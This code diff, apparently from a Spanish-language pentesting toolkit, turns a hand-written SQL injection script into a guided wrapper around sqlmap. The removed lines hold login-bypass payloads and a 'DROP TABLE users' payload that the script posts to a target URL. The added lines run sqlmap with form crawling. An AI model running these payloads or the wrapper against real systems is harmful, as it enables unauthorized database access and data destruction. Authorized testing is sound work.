@@ -1,90 +1,86 @@
-import os
-import sys
-import urllib.parse
-import requests
-from colorama import Fore, Back, Style
+"""Wrapper para sqlmap en entornos autorizados."""
 
-def clear_screen():
-    os.system("cls" if os.name == "nt" else "clear")
+from __future__ import annotations
 
-def sql_injection_main():
-    clear_screen()
-    banner()
-    while True:
-        try:
-            target_url = input("Ingrese la URL objetivo (o escriba 'n' para salir): ")
-            if target_url.lower() == 'n':
-                break  # Salir del programa si el usuario escribe 'n'
-            elif not target_url.startswith("http://") and not target_url.startswith("https://"):
-                raise ValueError(Fore.BLACK + Back.RED + "La URL debe comenzar con 'http://' o 'https://'" + Style.RESET_ALL)
+import shutil
+import subprocess
+from pathlib import Path
 
-            num_injections = int(input("Ingrese el número de inyecciones de SQL que desea generar: "))
+from colorama import Back, Fore, Style, init
+from Python.ui import draw_banner, pause, print_error, print_info, print_ok
 
-            if num_injections <= 0:
-                raise ValueError(Fore.BLACK + Back.RED + "El número de inyecciones debe ser un entero positivo." + Style.RESET_ALL)
-
-            # Lista de payloads para inyección SQL
-            payloads = [
-                "' OR '1'='1",
-                "' OR '1'='1';--",
-                "' OR 1=1--",
-                "' OR 'x'='x",
-                "') OR ('x'='x",
-                "'; DROP TABLE users; --"
-                # Agregue más payloads según sus necesidades
-            ]
-
-            # Construir los datos del formulario
-            data = {
-                'username': 'test',
-                'password': 'test'
-            }
-
-            for payload in payloads:
-                # Agregar el payload al campo username
-                data['username'] = payload
-
-                # Realizar la solicitud HTTP POST
-                response = requests.post(target_url, data=data)
-
-                # Analizar la respuesta y determinar si la inyección fue exitosa
-                if "Bienvenido" in response.text:
-                    print(Fore.BLACK + Back.GREEN + f"Inyección de SQL exitosa con payload: {payload}" + Style.RESET_ALL)
-                    break  # Salir del bucle si se encuentra una inyección exitosa
-                else:
-                    print(Fore.BLACK + Back.RED + f"No se encontraron indicios de inyección de SQL con payload: {payload}" + Style.RESET_ALL)
-
-        except ValueError as ve:
-            print(Fore.BLACK + Back.RED + "Error:" + str(ve) + Style.RESET_ALL)
-            print(Fore.BLACK + Back.RED + "Inserte datos válidos." + Style.RESET_ALL)
-            continue
-
-        except requests.RequestException as re:
-            print(Fore.BLACK + Back.RED + "Error de solicitud HTTP:", re + Style.RESET_ALL)
-            continue
-
-        except Exception as e:
-            clear_screen()
-            print(Fore.BLACK + Back.RED + "Error:", e + Style.RESET_ALL)
-            continue
-    # Mostrar el banner nuevamente al finalizar
-    banner()
-
-
+init(autoreset=True)
+COMMON_ASCII = r"""
+ SQL Injection
+"""
+BANNER_COLOR = "\033[31m"
 
 def banner():
-    cartel = r"""
-      ___  ___  _      ___        _       _   _         
-     / __|/ _ \| |    |_ _|_ _   (_)_____| |_(_)___ _ _   
-     \__ \ (_) | |__   | || ' \ / / -_) _|  _| / _ \ ' \ 
-     |___/\__\_\____| |___|_||_| /\___\__|\__|_\___/_||_|
-                            __/ /
-                           |___/                    
-    """
-    print(Fore.CYAN + Style.BRIGHT + cartel + Style.RESET_ALL)
-    print(Fore.CYAN + Style.BRIGHT + "*********************************************************" + Style.RESET_ALL)
+    draw_banner("", COMMON_ASCII, "Wrapper guiado para sqlmap", BANNER_COLOR)
+
+
+def build_sqlmap_command(target_url: str, output_dir: str, level: str, risk: str, extra_args: str) -> list[str]:
+    command = [
+        "sqlmap",
+        "-u",
+        target_url,
+        "--batch",
+        "--random-agent",
+        "--forms",
+        "--level",
+        level,
+        "--risk",
+        risk,
+        "--output-dir",
+        output_dir,
+    ]
+    if extra_args.strip():
+        command.extend(extra_args.split())
+    return command
+
+
+def run_sqlmap(command: list[str]) -> int:
+    process = subprocess.Popen(command)
+    return process.wait()
+
+
+def sql_injection_main():
+    while True:
+        banner()
+        if not shutil.which("sqlmap"):
+            print_error("No se encontro `sqlmap` en PATH. Instala sqlmap en Kali o anadelo al sistema.")
+            pause()
+            return
+
+        target_url = input("URL objetivo ('n' para volver): ").strip()
+        if target_url.lower() == "n":
+            return
+        if not target_url.startswith(("http://", "https://")):
+            pause(Fore.RED + "La URL debe empezar por http:// o https://. Pulsa Enter...")
+            continue
+
+        level = input("Nivel sqlmap [1-5] (default 2): ").strip() or "2"
+        risk = input("Riesgo sqlmap [1-3] (default 1): ").strip() or "1"
+        output_dir = input("Directorio de salida [sqlmap_output]: ").strip() or "sqlmap_output"
+        extra_args = input(
+            "Argumentos extra opcionales (ej: --cookie=PHPSESSID=... --dbs), vacio si no hace falta: "
+        )
+
+        command = build_sqlmap_command(target_url, output_dir, level, risk, extra_args)
+        print_info("\nComando a ejecutar:")
+        print(" ".join(command))
+        confirm = input("\nEjecutar sqlmap? (s/n): ").strip().lower()
+        if confirm != "s":
+            continue
+
+        code = run_sqlmap(command)
+        resolved_output = Path(output_dir).resolve()
+        if code == 0:
+            print_ok(f"\nsqlmap finalizo correctamente. Revisa: {resolved_output}")
+        else:
+            print(Fore.YELLOW + f"\nsqlmap termino con codigo {code}. Revisa: {resolved_output}")
+        pause()
+
 
 if __name__ == "__main__":
-    clear_screen()
-    banner()
     sql_injection_main()
